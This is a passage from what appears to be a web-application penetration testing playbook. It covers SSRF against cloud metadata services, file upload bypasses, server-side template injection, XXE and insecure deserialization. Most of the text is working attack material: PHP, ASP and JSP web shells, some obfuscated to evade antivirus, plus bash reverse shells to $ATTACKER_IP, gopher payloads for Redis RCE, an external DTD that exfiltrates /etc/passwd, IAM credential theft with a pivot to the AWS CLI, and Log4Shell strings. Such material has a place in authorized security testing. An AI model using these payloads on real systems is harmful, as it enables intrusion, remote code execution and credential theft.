http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# Via DNS alias
http://instance-data/latest/meta-data/
http://169.254.169.254.nip.io/latest/meta-data/

# ECS task metadata
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

**Extracting credentials:**

```bash
# After SSRF to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Response shows role name. Then:
# Request: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Response contains: AccessKeyId, SecretAccessKey, Token

# Use credentials to pivot
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... \
  aws s3 ls --region us-east-1
```

#### AWS IMDSv2 (Requires token, harder via SSRF)

```
# IMDSv2 requires a PUT request with X-aws-ec2-metadata-token-ttl-seconds header
# Some SSRF vectors that support PUT (gopher://) can bypass this
# DNS rebinding also bypasses IMDSv2
```

#### Azure IMDS

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
# In SSRF context — try CRLF injection to add header

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

#### GCP (Google Cloud)

```
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/?recursive=true

# Alternative endpoints
http://169.254.169.254/computeMetadata/v1/
http://metadata/computeMetadata/v1/
```

#### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```

### 4.5 Internal Service Discovery via SSRF

```bash
# Port scan via SSRF — measure response time/content to infer open ports
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017 2181 8500 2379; do
  curl -s "$TARGET_URL/fetch?url=http://127.0.0.1:$port/" \
    -o $OUTPUT_DIR/ssrf-port-$port.txt
done

# Common internal targets
http://127.0.0.1:22/        # SSH
http://127.0.0.1:3306/      # MySQL
http://127.0.0.1:5432/      # PostgreSQL
http://127.0.0.1:6379/      # Redis
http://127.0.0.1:27017/     # MongoDB
http://127.0.0.1:9200/      # Elasticsearch
http://127.0.0.1:8500/      # Consul
http://127.0.0.1:2379/      # etcd
http://127.0.0.1:4040/      # Ngrok admin
http://10.0.0.1:6443/api/v1/namespaces   # Kubernetes API
http://localhost:8983/solr/  # Apache Solr admin
```

### 4.6 SSRF Filter Bypass Techniques

```
# Decimal encoding (127.0.0.1 = 2130706433)
http://2130706433/

# Octal (127.0.0.1 = 0177.0.0.1)
http://0177.0.0.1/

# Hex (127.0.0.1 = 0x7f000001)
http://0x7f000001/

# Mixed formats
http://0x7f.0x0.0x0.0x1/

# IPv6
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31/

# Double URL encoding
http://%2531%2532%2537%2e%2530%2e%2530%2e%2531/

# Domain tricks
http://127.0.0.1.nip.io/
http://localtest.me/

# DNS rebinding (attacker-controlled domain resolves to 127.0.0.1 on second request)
http://7f000001.1time.$ATTACKER_DOMAIN/

# URL confusion
https://$ATTACKER_DOMAIN#@169.254.169.254/
https://$ATTACKER_DOMAIN@169.254.169.254/metadata
https://169.254.169.254:80@$ATTACKER_DOMAIN/
```

### 4.7 Protocol Smuggling

```
# File protocol — read local files
file:///etc/passwd
file://localhost/etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts

# Gopher protocol — send raw TCP to any service
# Redis via gopher (flush + set cron for RCE):
gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2456%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1%0a%0a%0a%0a%0a%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*1%0d%0a%244%0d%0asave%0d%0a

# Dict protocol — Memcached
dict://127.0.0.1:11211/stats

# SMTP via gopher
gopher://127.0.0.1:25/_HELO attacker.com

# Use Gopherus to generate gopher payloads
# python gopherus.py --exploit redis
# python gopherus.py --exploit smtp
# python gopherus.py --exploit mysql
```

### 4.8 Redirect Chain Attack

```bash
# Host a redirect server at $ATTACKER_DOMAIN that redirects to internal target
# PHP redirect:
# header("Location: http://169.254.169.254/latest/meta-data/");

# Some SSRF filters check the initial URL but follow redirects
# This bypasses filters that only check the first URL

# Verify: submit ?url=http://$ATTACKER_DOMAIN/redirect
# Watch if server follows redirect to 169.254.169.254
```

### 4.9 Evidence Collection — SSRF

```bash
# Save Burp Collaborator interaction log
# Screenshot showing DNS/HTTP callback from target server

# For cloud metadata — save full response
curl -s "$TARGET_URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE" \
  -o $OUTPUT_DIR/ssrf-aws-creds.txt

# Document the full chain: injection point → internal URL → response
```

**Decision Tree:**

```
SSRF confirmed (Burp Collaborator sees request)?
  → Cloud environment? → Try metadata endpoints for each provider
    → AWS? → Enumerate IAM roles → steal credentials
    → GCP? → Get service account token
    → Azure? → Get managed identity token
  → Not cloud? → Probe internal services (6379 Redis, 9200 ES, 27017 Mongo)
  → Redis accessible? → Use gopher:// for RCE via cron
  → Kubernetes? → Access http://10.0.0.1:6443 API
  → Filter blocking 169.254.169.254? → Try IP encoding bypasses
  → SSRF blocked on redirects? → Try DNS rebinding
```

---

## Section 5: File Upload Attacks

**OWASP:** A03:2021 Injection | **CWE:** CWE-434 | **Severity:** Critical (RCE potential)

### 5.1 Attack Chain Overview

```
IDENTIFY upload functionality
  → BYPASS extension validation
    → BYPASS MIME type / content validation
      → UPLOAD web shell
        → LOCATE uploaded file
          → EXECUTE commands via web shell
            → UPGRADE to reverse shell
```

### 5.2 Extension Bypass Matrix

```
# PHP variants (when .php is blocked)
.php2 .php3 .php4 .php5 .php6 .php7
.pht .phtml .shtml
.phar
.pgif

# Case variation
.PHP .Php .pHp .PHp .pHP

# ASP/ASPX variants
.asp .aspx .cer .asa .ashx .asmx .aspq .axd .cshtml

# JSP variants
.jsp .jspx .jspf .jspa .jsw .jsv .wss .do .action

# Double extension (server strips last or executes first)
shell.php.jpg
shell.jpg.php
shell.php.xxxxx   # Unknown extension fallback

# Special character tricks
shell.php%00.jpg    # Null byte (older PHP < 5.3.4)
shell.php%20        # Trailing space
shell.php.          # Trailing dot
shell.php::$DATA    # Windows NTFS ADS
shell.php/
shell.php;.jpg

# URL encoding of extension characters
shell.p%68p         # p + URL-encoded 'h' + p
```

### 5.3 MIME Type and Magic Bytes Bypass

```bash
# Step 1: Change Content-Type header to accepted image type
# In Burp Intercept → modify:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Step 2: Add magic bytes to PHP shell (for content-type sniffing)
# GIF89a polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > $OUTPUT_DIR/shell.php.gif

# JPEG magic bytes polyglot
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > $OUTPUT_DIR/shell.php.jpg

# PNG magic bytes polyglot
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > $OUTPUT_DIR/shell.php.png

# Create using exiftool (most reliable polyglot)
cp legit.jpg $OUTPUT_DIR/shell.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' $OUTPUT_DIR/shell.jpg -o $OUTPUT_DIR/polyglot.php

# ImageMagick polyglot
convert -size 32x32 xc:white -comment '<?php system($_GET["c"]); ?>' $OUTPUT_DIR/shell.png
```

### 5.4 Apache .htaccess Trick

```apache
# Upload filename: .htaccess
# Content:
AddType application/x-httpd-php .jpg

# Alternative
AddHandler php-script .jpg
SetHandler application/x-httpd-php

# Result: all .jpg files in this directory execute as PHP
# Then upload shell.jpg containing PHP code
```

### 5.5 Web Shell Payloads

#### PHP Web Shells

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
<?php echo `$_GET[cmd]`; ?>
<?=`{$_GET[c]}`?>

# Eval-based (accepts full PHP)
<?php eval($_POST['code']); ?>
<?php @eval($_REQUEST['c']); ?>

# Obfuscated (evade AV)
<?php $a='sys'.'tem';$a($_GET['c']); ?>
<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>

# PHP reverse shell (one-liner)
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'"); ?>

# Full featured PHP web shell URL: https://github.com/WhiteWinterWolf/wwwolf-php-webshell
```

#### ASP Web Shells

```asp
<%eval request("cmd")%>
<%Response.Write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()%>
```

#### ASPX Web Shells

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(Process.Start(new ProcessStartInfo(Request["c"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()); %>
```

#### JSP Web Shells

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<%@ page import="java.io.*"%>
<%
Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
DataInputStream in=new DataInputStream(p.getInputStream());
String line;
while((line=in.readLine())!=null){out.println(line);}
%>
```

### 5.6 ZIP Slip (Path Traversal via Archive)

```python
# Create malicious ZIP with path traversal to escape web root
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.write('shell.php', '../../../var/www/html/shell.php')

# Upload zip to any "extract archive" feature
# Server extracts ../../../var/www/html/shell.php → places shell in web root
```

### 5.7 Locating Uploaded Files

```bash
# Common upload paths to check after upload
$TARGET_URL/uploads/shell.php
$TARGET_URL/files/shell.php
$TARGET_URL/media/shell.php
$TARGET_URL/images/shell.php
$TARGET_URL/assets/shell.php
$TARGET_URL/static/shell.php
$TARGET_URL/content/shell.php
$TARGET_URL/tmp/shell.php
$TARGET_URL/shell.php

# Enumerate upload location from response:
# - Check Location header after upload
# - Check response body for file path
# - Use feroxbuster to discover upload directories

# If extension was preserved, try all variants
for ext in php phtml php5 phar jpg.php; do
  curl -s "$TARGET_URL/uploads/shell.$ext?cmd=id"
done
```

### 5.8 Establishing Shell Access

```bash
# Test webshell execution
curl "$TARGET_URL/uploads/shell.php?cmd=id"
curl "$TARGET_URL/uploads/shell.php?cmd=whoami"

# Upgrade to reverse shell
# Start listener
nc -lvnp 4444

# Trigger reverse shell via webshell
curl "$TARGET_URL/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/$ATTACKER_IP/4444%200>%261'"

# Or URL-encoded
curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'" \
  "$TARGET_URL/uploads/shell.php"
```

### 5.9 Evidence Collection — File Upload

```bash
# Document the bypass technique used
echo "Extension bypass: .phtml" >> $OUTPUT_DIR/file-upload-evidence.txt
echo "MIME bypass: Content-Type changed to image/jpeg" >> $OUTPUT_DIR/file-upload-evidence.txt

# Save Burp request showing the bypass
# Screenshot of command execution output (id, whoami, hostname)

# Record exact upload URL and webshell access URL
echo "Upload URL: $TARGET_URL/upload" >> $OUTPUT_DIR/file-upload-evidence.txt
echo "Shell URL: $TARGET_URL/uploads/shell.phtml?cmd=id" >> $OUTPUT_DIR/file-upload-evidence.txt
```

**Decision Tree:**

```
Upload endpoint found?
  → Upload plain .php → Blocked?
    → Try .phtml, .php5, .phar (alternate extensions)
    → Try uppercase .PHP
    → Try double extension shell.php.jpg
  → Blocked by MIME check?
    → Change Content-Type to image/jpeg
    → Add GIF89a magic bytes: GIF89a<?php system($_GET['cmd']); ?>
    → Use exiftool polyglot
  → Blocked by content check?
    → Upload .htaccess first (Apache) to execute .jpg as PHP
    → Try ZIP slip if archive extraction exists
  → Uploaded but can't execute?
    → Find upload directory via enumeration
    → Check if path traversal in filename changes destination
```

---

## Section 6: Server-Side Template Injection (SSTI)

**OWASP:** A03:2021 Injection | **CWE:** CWE-94 | **Severity:** Critical (RCE)

### 6.1 Attack Chain Overview

```
INJECT polyglot detection probe
  → OBSERVE math evaluation in response
    → IDENTIFY template engine
      → APPLY engine-specific RCE payload
        → EXECUTE system commands
          → ESTABLISH reverse shell
```

### 6.2 Detection Methodology

**Safe polyglot probe (no side effects):**

```
${{<%[%'"}}%\.
```

**Math-based engine probes (inject in all user-controlled fields):**

```
{{7*7}}        → Output 49? → Jinja2 or Twig
${7*7}         → Output 49? → Freemarker, Velocity, or Spring EL
<%= 7*7 %>     → Output 49? → ERB (Ruby)
#{7*7}         → Output 49? → Ruby string interpolation
*{7*7}         → Output 49? → Spring Expression Language (Thymeleaf)
[[7*7]]        → Output 49? → Pebble or Velocity
```

**Engine discrimination:**

```
{{7*'7'}} → '7777777' → Jinja2 (Python)
{{7*'7'}} → '49'      → Twig (PHP)
```

**Decision Tree for Engine Identification:**

```
{{7*7}} → 49?
  YES → Test {{7*'7'}}
    → 7777777 → Jinja2 (Python/Flask)
    → 49      → Twig (PHP)
  NO → Test ${7*7} → 49?
    YES → Try <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
         YES → Freemarker (Java)
         NO  → Velocity or SmartY
    NO → Test <%= 7*7 %> → 49?
      YES → ERB (Ruby on Rails)
      NO  → *{7*7} → 49? → Spring EL (Java/Thymeleaf)
```

### 6.3 Jinja2 (Python / Flask) RCE

```python
# Basic confirmation
{{7*7}}
{{config}}
{{config.items()}}

# RCE via config object (simplest)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

# RCE via cycler (alternative)
{{cycler.__init__.__globals__.os.popen('id').read()}}

# RCE via class traversal (robust)
{{''.__class__.__mro__[1].__subclasses__()}}   # List subclasses — find Popen index
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Dynamic Popen discovery (engine finds index automatically)
{% for x in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in x.__name__ %}
    {{x(['id'],stdout=-1).communicate()}}
  {% endif %}
{% endfor %}

# Read file
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"').read()}}

# Filter bypass — dots and brackets blocked
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Filter bypass — underscore filtered
{{request|attr("__class__")}} → {{request|attr("\x5f\x5fclass\x5f\x5f")}}
```

### 6.4 Twig (PHP) RCE

```php
// Basic test
{{7*7}}
{{dump(app)}}

// RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("id")}}

// Alternative RCE (Twig 2/3)
{{'id'|filter('system')}}
{{'id'|map('system')|join}}

// Read file
{{source('/etc/passwd')}}

// RCE Twig v1 (cache write)
{{_self.env.setCache("ftp://$ATTACKER_IP/")}}{{_self.env.loadTemplate("backdoor")}}
```

### 6.5 Freemarker (Java) RCE

```
// Basic test
${7*7}
${product.getClass()}

// RCE via Execute
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("whoami")}

// Alternative syntax
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// Reverse shell
${"freemarker.template.utility.Execute"?new()("bash -c {echo,BASE64PAYLOAD}|{base64,-d}|bash")}
```

### 6.6 Velocity (Java) RCE

```
// RCE via Runtime.exec
#set($x='')\
#set($rt=$x.class.forName('java.lang.Runtime'))\
#set($chr=$x.class.forName('java.lang.Character'))\
#set($str=$x.class.forName('java.lang.String'))\
#set($ex=$rt.getRuntime().exec('id'))\
$ex.waitFor()\
#set($out=$ex.getInputStream())\
#foreach($i in [1..$out.available()])\
$str.valueOf($chr.toChars($out.read()))\
#end
```

### 6.7 ERB (Ruby on Rails) RCE

```ruby
# Basic test
<%= 7*7 %>
<%= system('id') %>

# RCE variants
<%= `id` %>
<%= IO.popen('id').read %>
<%= require 'open3'; Open3.capture2('id')[0] %>

# Read file
<%= File.read('/etc/passwd') %>

# Reverse shell
<%= require "socket"; s=TCPSocket.open("$ATTACKER_IP",4444); loop{cmd=s.gets.chomp; out=`#{cmd}`; s.print(out)} %>
```

### 6.8 Smarty (PHP) and Mako (Python)

```
// Smarty
{php}system('id');{/php}
{system('id')}
{$smarty.version}

// Mako (Python)
${__import__('os').system('id')}
<% import os; os.system('id') %>
```

### 6.9 tplmap Automation

```bash
# Auto-detect and exploit SSTI
tplmap -u "http://$TARGET_URL/page?name=test"

# POST request
tplmap -u "http://$TARGET_URL/page" --data "name=test" -p name

# Specify engine
tplmap -u "http://$TARGET_URL/page?name=test" --engine jinja2

# OS command shell
tplmap -u "http://$TARGET_URL/page?name=test" --os-shell

# Reverse shell
tplmap -u "http://$TARGET_URL/page?name=test" --reverse-shell $ATTACKER_IP 4444

# Upload/download file
tplmap -u "http://$TARGET_URL/page?name=test" --upload /local/file /remote/path
tplmap -u "http://$TARGET_URL/page?name=test" --download /etc/passwd $OUTPUT_DIR/passwd
```

### 6.10 SSTI Quick Reference

| Engine | Language | Detection | RCE Payload |
|--------|----------|-----------|-------------|
| Jinja2 | Python | `{{7*'7'}}` → 7777777 | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| Twig | PHP | `{{7*'7'}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| Freemarker | Java | `${7*7}` → 49 | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Velocity | Java | `#set($x=7*7)$x` | `#set($rt=...)$rt.getRuntime().exec("id")` |
| ERB | Ruby | `<%= 7*7 %>` → 49 | `<%= \`id\` %>` |
| Smarty | PHP | `{$smarty.version}` → version | `{system('id')}` |
| Mako | Python | `${7*7}` | `${__import__('os').system('id')}` |

---

## Section 7: XML External Entity Injection (XXE)

**OWASP:** A05:2021 Security Misconfiguration | **CWE:** CWE-611 | **Severity:** High-Critical

### 7.1 Attack Chain Overview

```
FIND XML input (SOAP, XML API, file upload, Content-Type switch)
  → INJECT entity reference
    → CONFIRM visible file read (classic)
    → OR CONFIRM blind OOB via Collaborator (external DTD)
      → EXFILTRATE sensitive files (/etc/passwd, source code, keys)
        → PIVOT to SSRF (cloud metadata, internal services)
```

### 7.2 Finding XML Input Points

```
- SOAP web services (Content-Type: text/xml or application/soap+xml)
- XML-based APIs (Content-Type: application/xml)
- File uploads accepting: .docx, .xlsx, .pptx, .svg, .rss, .atom, .xml
- JSON endpoints (try switching Content-Type to application/xml)
- Form fields that accept XML data
```

### 7.3 Classic XXE — File Read

```xml
<!-- Linux file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Windows file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root><data>&xxe;</data></root>

<!-- PHP source code read (handles special chars via base64) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root>&xxe;</root>
<!-- Decode: echo "BASE64_RESPONSE" | base64 -d -->
```

**Key files to target:**

```
Linux:
/etc/passwd          # User accounts
/etc/shadow          # Password hashes (root required)
/etc/hostname        # Hostname
/etc/hosts           # Host mappings
~/.ssh/id_rsa        # SSH private key
~/.aws/credentials   # AWS credentials
/proc/self/environ   # Process environment variables
/var/www/html/*.php  # Web application source code

Windows:
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    # App settings / connection strings
C:\xampp\apache\conf\httpd.conf
C:\Users\Administrator\Desktop\*
```

### 7.4 XXE via SSRF

```xml
<!-- AWS metadata access via XXE SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<!-- Internal network probe -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<root>&xxe;</root>
```

### 7.5 Blind XXE — Out-of-Band Exfiltration

**Step 1 — Confirm OOB connectivity:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "http://$COLLAB_URL/xxe-test">
  %xxe;
]>
<root/>
```

**Step 2 — Host malicious DTD on attacker server:**

```xml
<!-- evil.dtd hosted at http://$ATTACKER_IP/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://$ATTACKER_IP/?x=%file;'>">
%eval;
%exfil;
```

**Step 3 — XXE payload referencing attacker DTD:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://$ATTACKER_IP/evil.dtd">
  %dtd;
]>
<root/>
```

**File exfiltration arrives at attacker HTTP server as URL parameter.**

### 7.6 Error-Based XXE (When No HTTP OOB Allowed)

```xml
<!-- evil-error.dtd hosted at http://$ATTACKER_IP/evil-error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

```xml
<!-- XXE payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///NONEXISTENT/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo/>
```

### 7.7 XXE via File Upload

```bash
# SVG XXE (upload as image)
cat > $OUTPUT_DIR/evil.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
EOF

# DOCX XXE (Office XML = ZIP archive)
mkdir $OUTPUT_DIR/docx_contents
cp target.docx $OUTPUT_DIR/
unzip $OUTPUT_DIR/target.docx -d $OUTPUT_DIR/docx_contents/
# Edit $OUTPUT_DIR/docx_contents/word/document.xml
# Add to top of file: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Add &xxe; inside document body
zip -r $OUTPUT_DIR/malicious.docx $OUTPUT_DIR/docx_contents/
```

### 7.8 Content-Type Switching Attack

```
# Original JSON request:
Content-Type: application/json
{"search":"term"}

# Switch to XML:
Content-Type: application/xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><search>&xxe;</search>
```

### 7.9 XXE Decision Tree

| Scenario | Technique |
|----------|-----------|
| Response shows entity value | Classic in-band file read |
| PHP application | php://filter wrapper for base64-encoded read |
| No entity in response, HTTP allowed | External DTD OOB exfiltration |
| No HTTP out, XML errors visible | Error-based via local DTD |
| SVG/XML file upload | SVG with XXE payload |
| Office document upload | DOCX/XLSX XML injection |
| JSON endpoint | Try Content-Type: application/xml switch |

---

## Section 8: Insecure Deserialization

**OWASP:** A08:2021 Software and Data Integrity Failures | **CWE:** CWE-502 | **Severity:** Critical

### 8.1 Attack Chain Overview

```
DETECT serialized data (magic bytes, format patterns)
  → IDENTIFY serialization format and language
    → SELECT appropriate gadget chain tool
      → GENERATE payload
        → INJECT and confirm execution (URLDNS → code exec)
```

### 8.2 Detection — Magic Bytes Reference

```
Java:    AC ED 00 05 (hex)  |  rO0AB (base64)
PHP:     O:, a:, s:, b:, d:, i: patterns
Python:  \x80\x04 or \x80\x02 (pickle protocol headers)
.NET:    AAEAAAD... (base64 BinaryFormatter)  |  00 01 00 00 00 (raw)
Ruby:    \x04\x08 (Marshal)
Node.js: _$$ND_FUNC$$_ (node-serialize pattern)
```

**Check these locations:**

```
- HTTP cookies (base64 decode and inspect)
- Hidden form fields
- JWT payload claims
- API request/response bodies with type annotations ($type, __type, @class)
- URL parameters
- File uploads
```

```bash
# Detect Java serialized object in cookie
echo "$SESSION_COOKIE" | base64 -d | xxd | head -5
# Look for: ac ed 00 05

# Detect PHP serialized data
echo "$SESSION_COOKIE" | base64 -d
# Look for: O:, a:2:{, s:
```

### 8.3 Java Deserialization — ysoserial

```bash
# List available gadget chains
java -jar ysoserial.jar 2>/dev/null | head -30

# Detection payload (DNS only — safe probe)
java -jar ysoserial.jar URLDNS "http://$COLLAB_URL" > $OUTPUT_DIR/urldns.ser
# Send — if Collaborator sees DNS, deserialization is occurring

# Code execution gadget chains (try all if one fails)
java -jar ysoserial.jar CommonsCollections1 'id' > $OUTPUT_DIR/cc1.ser
java -jar ysoserial.jar CommonsCollections2 'id' > $OUTPUT_DIR/cc2.ser
java -jar ysoserial.jar CommonsCollections3 'id' > $OUTPUT_DIR/cc3.ser
java -jar ysoserial.jar CommonsCollections4 'id' > $OUTPUT_DIR/cc4.ser
java -jar ysoserial.jar CommonsCollections5 'id' > $OUTPUT_DIR/cc5.ser
java -jar ysoserial.jar CommonsCollections6 'id' > $OUTPUT_DIR/cc6.ser
java -jar ysoserial.jar Groovy1 'id' > $OUTPUT_DIR/groovy1.ser
java -jar ysoserial.jar Spring1 'id' > $OUTPUT_DIR/spring1.ser
java -jar ysoserial.jar Spring2 'id' > $OUTPUT_DIR/spring2.ser
java -jar ysoserial.jar BeanShell1 'id' > $OUTPUT_DIR/bean.ser

# Reverse shell payload
java -jar ysoserial.jar CommonsCollections1 \
  'bash -c {echo,BASE64_REVSHELL}|{base64,-d}|bash' > $OUTPUT_DIR/revshell.ser
# Generate BASE64_REVSHELL: echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1' | base64

# Base64 encode for HTTP parameter injection
cat $OUTPUT_DIR/cc1.ser | base64 -w 0 > $OUTPUT_DIR/cc1_b64.txt

# Send via curl
curl -X POST "$TARGET_URL/api/endpoint" \
  --data-binary @$OUTPUT_DIR/cc1.ser \
  -H "Content-Type: application/x-java-serialized-object"

# JNDI injection (Log4Shell style)
# Inject into HTTP headers checked by Log4j
curl -H "X-Api-Version: \${jndi:ldap://$ATTACKER_IP:1389/exploit}" $TARGET_URL
curl -H "User-Agent: \${jndi:ldap://$ATTACKER_IP:1389/exploit}" $TARGET_URL
curl -H "Referer: \${jndi:ldap://$ATTACKER_IP:1389/exploit}" $TARGET_URL

# Log4Shell obfuscation bypasses
\${jndi:\${lower:l}\${lower:d}a\${lower:p}://$ATTACKER_IP/exploit}
\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://$ATTACKER_IP/exploit}
```

### 8.4 PHP Deserialization — phpggc

```bash
# List gadget chains
phpggc -l
phpggc -l | grep Laravel
phpggc -l | grep Symfony

# Framework-specific RCE chains
phpggc Laravel/RCE7 system id
phpggc Symfony/RCE4 system id
phpggc Yii/RCE1 system id
phpggc Magento/RCE3 system id
phpggc Drupal7/RCE1 system id

# Write webshell
phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'

# Reverse shell
phpggc Laravel/RCE7 system \
  'bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"'

# Output formats
phpggc Laravel/RCE7 system 'id' -b        # Base64
phpggc Laravel/RCE7 system 'id' -j        # JSON
phpggc Laravel/RCE7 system 'id' -s        # URL-encoded
```

**PHP manual object injection:**

```php
// Identify vulnerable code: $obj = unserialize($_COOKIE['data'])
// Find classes with magic methods: __destruct(), __wakeup(), __toString()

// Craft payload targeting vulnerable class:
// O:6:"Config":2:{s:4:"file";s:27:"/var/www/html/config.php";s:7:"command";s:16:"cat /etc/passwd";}

// Base64-encode and inject via cookie
// Cookie: data=TzozOiJVc2VyIjoxOntzOjQ6ImZpbGUiO3M6MTE6Ii9ldGMvcGFzc3dkIjt9
```

### 8.5 Python Pickle Exploitation

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

